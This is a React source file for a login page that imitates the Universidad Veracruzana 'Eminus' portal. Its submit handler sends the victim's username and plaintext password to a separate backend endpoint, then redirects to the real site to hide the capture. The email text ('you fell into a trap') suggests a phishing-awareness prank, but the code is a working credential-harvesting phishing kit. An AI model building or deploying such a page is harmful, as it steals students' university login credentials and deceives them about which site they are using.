import { useState } from "react";
import EminusLogos from "../src/images/EMINUS_login.svg";
import EminusSearch from "../src/images/img_eminus.png";

import TextField from "@mui/material/TextField";
import { IconButton } from "@mui/material";
import Visibility from "@mui/icons-material/Visibility";
import VisibilityOff from "@mui/icons-material/VisibilityOff";
import clsx from "clsx";
import axios from "axios";

const App = () => {
  const [typeInput, setTypeInput] = useState("password");

  const [isUser, setIsUser] = useState(false);
  const [isPassword, setIsPassword] = useState(false);

  const [user, setUser] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const onSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    if (user === "" || password === "") {
      setIsUser(true);
      setIsPassword(true);
      return;
    }

    let correo = "";

    if (user.indexOf("Z") >= -1 || user.indexOf("z") >= -1) {
      correo = `${user}@estudiantes.uv.mx`;
    } else {
      correo = `z${user}@estudiantes.uv.mx`;
    }

    const config = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        correo,
        subject: "Credenciales Eminus",
        emailContent: "Has caído en una trampa, ten más cuidado",
        password,
      }),
      data: {
        email: correo,
        subject: "Credenciales Eminus",
        emailContent: "Has caído en una trampa, ten más cuidado",
        password,
      },
    };

    axios
      .request(`${import.meta.env.VITE_URL}/enviar`, config)
      .then((res) => {
        if (res.data === "Correo enviado correctamente.") {
          location.href = "https://eminus.uv.mx/eminus4";
        }
      })
      .catch(() => {
        alert("Error al enviar el correo");
        setIsLoading(false);
      });
  };

  return (
    <div>
      <div className="w-full flex flex-row justify-end">
        <p className="bg-[#0D47A1] text-white font-normal text-[18px] right-0 px-[12px] text-center">
          Universidad Veracruzana
        </p>
      </div>

      <div className=" my-10  w-full flex flex-col justify-center items-center gap-5 py-[3rem] px-[2rem]">
        <div className="w-full flex flex-col justify-center items-center mb-[4rem]">
          <img src={EminusLogos} className="w-[268px] h-[80px]" />
          <h1 className="text-center font-thin h-[36px] text-[30px] text-[#67666e] font-roboto">
            Inicio de sesión
          </h1>
        </div>

        <form
          onSubmit={onSubmit}
          className="flex flex-col justify-center items-center gap-5 w-full mb-[2rem]"
        >
          <div style={{ width: "100%" }}>
            <TextField
              onChange={(e) => {
                e.target.value === "" ? setIsUser(true) : setIsUser(false);
                setUser(e.target.value);
              }}
              onBlur={(e) =>
                e.target.value === "" ? setIsUser(true) : setIsUser(false)
              }
              error={isUser ? true : false}
              id="usuario"
              label="Usuario"
              className="text-[14px] font-roboto"
              variant="standard"
              fullWidth
              InputProps={{
                disableUnderline: true,
                style: {
                  borderBottom: `${clsx(
                    "1px solid",
                    isUser ? "red" : "black"
                  )}`,
                  paddingBottom: "0px",
                },
              }}
              style={{
                marginBottom: "20px",
              }}
            />

            <div
              className={clsx(
                "border-b-[1px] border-solid flex flex-row justify-center items-center",
                isPassword ? "border-red-500" : "border-black"
              )}
              style={{ display: "flex", alignItems: "center" }}
            >
              <TextField
                onChange={(e) => {
                  e.target.value === ""
                    ? setIsPassword(true)
                    : setIsPassword(false);
                  setPassword(e.target.value);
                }}
                onBlur={(e) =>
                  e.target.value === ""
                    ? setIsPassword(true)
                    : setIsPassword(false)
                }
                error={isPassword ? true : false}
                id="contraseña"
                label="Contraseña"
                type={typeInput}
                variant="standard"
                zs
                fullWidth
                InputProps={{
                  disableUnderline: true,
                  style: {
                    paddingBottom: "0px",
                  },
                }}
              />
              <IconButton
                onClick={() =>
                  setTypeInput(typeInput === "password" ? "text" : "password")
                }
                edge="end"
                aria-label="toggle password visibility"
              >
                {typeInput === "password" ? (
                  <VisibilityOff color="black" />
                ) : (
                  <Visibility color="black" />
                )}
              </IconButton>
            </div>
          </div>

          <div className="text-center flex flex-col gap-2 w-full my-4">
            <button
              className={clsx(
                "w-full h-[34px] rounded-[4px] text-[13px] font-roboto px-[15px] text-white border-[1px] border-solid border-[#22891f]",
                isLoading
                  ? "bg-[#2c742f] after:opacity-[.8] after:content-[' ']"
                  : "bg-[#22891f]"
              )}
              type="submit"
              disabled={isLoading}
            >
              Iniciar Sesión
            </button>

            <a
              href=""
              className="text-[#146CD0] font-normal text-[14px] font-roboto"
            >
              ¿Problemas para ingresar?
            </a>
          </div>
        </form>

        <div className="flex flex-row justify-center items-center bg-[#e3f2fd] px-5">
          <img src={EminusSearch} className="w-[118px] h-[62px]" />
          <p className="font-normal text-[12px] font-roboto text-[#146cd0]">
            Conoce más sobre EMINUS
          </p>
        </div>
      </div>

      <div className="text-center mt-5">
        <p className="text-[#666] text-[10px]">
          © 2024 Universidad Veracruzana. Todos los derechos reservados
        </p>
      </div>
    </div>
  );
};

export default App;
